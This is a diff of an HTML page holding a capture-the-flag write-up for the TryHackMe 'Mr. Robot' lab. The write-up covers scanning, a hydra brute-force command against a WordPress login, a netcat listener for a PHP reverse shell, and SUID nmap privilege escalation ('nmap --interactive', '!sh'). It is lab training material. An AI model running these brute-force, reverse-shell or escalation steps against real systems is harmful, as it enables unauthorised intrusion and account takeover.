@@ -2,46 +2,111 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mr. Robot CTF Writeup</title>
-  <link rel="stylesheet" href="../css/style.css" />
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      background-color: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', sans-serif;
+      padding: 2rem;
+      line-height: 1.6;
+    }
+    h1, h2 {
+      color: #58a6ff;
+    }
+    pre {
+      background-color: #161b22;
+      padding: 1rem;
+      overflow-x: auto;
+      border-radius: 5px;
+    }
+    img {
+      max-width: 100%;
+      margin: 1rem 0;
+    }
+    .meta-box {
+      background: #161b22;
+      border-left: 4px solid #58a6ff;
+      padding: 1rem;
+      margin-bottom: 2rem;
+      border-radius: 5px;
+    }
+    a {
+      color: #58a6ff;
+    }
+  </style>
 </head>
 <body>
-  <header>
-    <h1>Mr. Robot CTF Writeup</h1>
-    <nav>
-      <ul>
-        <li><a href="../index.html">Home</a></li>
-        <!--li><a href="mrrobot.html">Mr. Robot CTF</a></li -->
-        <!-- Add more navigation links here -->
-      </ul>
-    </nav>
-  </header>
-  <main>
-    <article>
-      <h2>Introduction</h2>
-      <p>The Mr. Robot CTF on TryHackMe is inspired by the TV show and involves exploiting a vulnerable WordPress installation to gain root access.</p>
+  <h1>Mr. Robot CTF Writeup</h1>
 
-      <h2>Enumeration</h2>
-      <p>Performed an Nmap scan to identify open ports:</p>
-      <pre><code>nmap -sC -sV -oN nmap_scan.txt 10.10.10.10</code></pre>
-      <p>Discovered open ports: 80 (HTTP), 443 (HTTPS).</p>
+  <div class="meta-box">
+    <p><strong>Machine Name:</strong> Mr. Robot</p>
+    <p><strong>Difficulty:</strong> Beginner Friendly</p>
+    <p><strong>Goal:</strong> Root the machine</p>
+    <p><strong>OS:</strong> Linux</p>
+  </div>
 
-      <h2>Exploitation</h2>
-      <p>Found a 'robots.txt' file containing a dictionary file 'fsocity.dic' and a key file 'key-1-of-3.txt'. Used the dictionary to brute-force WordPress login credentials.</p>
-
-      <h2>Privilege Escalation</h2>
-      <p>After gaining access as 'robot' user, found a SUID binary for Nmap. Used Nmap's interactive mode to spawn a root shell:</p>
-      <pre><code>nmap --interactive
-!sh
+  <h2>NMAP</h2>
+  <pre><code>PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
 </code></pre>
 
-      <h2>Conclusion</h2>
-      <p>Successfully captured all three keys and gained root access. This CTF was excellent for practicing web enumeration and privilege escalation techniques.</p>
-    </article>
-  </main>
-  <footer>
-    <p>&copy; 2025 Axoryn. All rights reserved.</p>
-  </footer>
+  <h2>Enumerating HTTP and HTTPS</h2>
+  <!-- TODO: Add image from assets/mrrobot -->
+  <p>Interacting with these didn’t do anything.</p>
+
+  <!-- TODO: Add robots.txt image -->
+  <p>Found first key and a wordlist in robots.txt</p>
+
+  <pre><code>wget http://10.10.99.69/fsocity.dic</code></pre>
+
+  <h2>Discovering Wordpress</h2>
+  <!-- TODO: Add gobuster image -->
+
+  <pre><code>cat fsocity.dic | grep angela</code></pre>
+
+  <p>Remove duplicates:</p>
+  <pre><code>sort fsocity.dic | uniq -d > clean-dic.txt</code></pre>
+
+  <!-- TODO: Add wp-login image -->
+
+  <h2>Username Enumeration</h2>
+  <!-- TODO: Add elliot image -->
+
+  <h2>Brute Force Login</h2>
+  <pre><code>hydra -L clean-dic.txt -p test &lt;target-ip&gt; http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username"</code></pre>
+
+  <p>Valid credentials: <code>elliot:XXXXXXX</code></p>
+
+  <!-- TODO: Add theme editor image -->
+
+  <h2>Reverse Shell</h2>
+  <p>Used <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey reverse shell</a>.</p>
+
+  <pre><code>nc -lvnp 1337</code></pre>
+
+  <!-- TODO: Add shell access image -->
+
+  <h2>Privilege Escalation</h2>
+  <!-- TODO: Add robot user directory image -->
+
+  <p>Found a hash, cracked it on <a href="https://crackstation.net">CrackStation</a>.</p>
+
+  <!-- TODO: Add cracked password and second key images -->
+
+  <h2>Root.txt</h2>
+  <!-- TODO: Add SUID binaries image -->
+
+  <p>Nmap was a SUID binary. Exploited via GTFOBins.</p>
+
+  <!-- TODO: Add GTFOBin and root access image -->
+
+  <p> Root access achieved!</p>
+
+  <p><a href="index.html">← Back to Home</a></p>
 </body>
 </html>
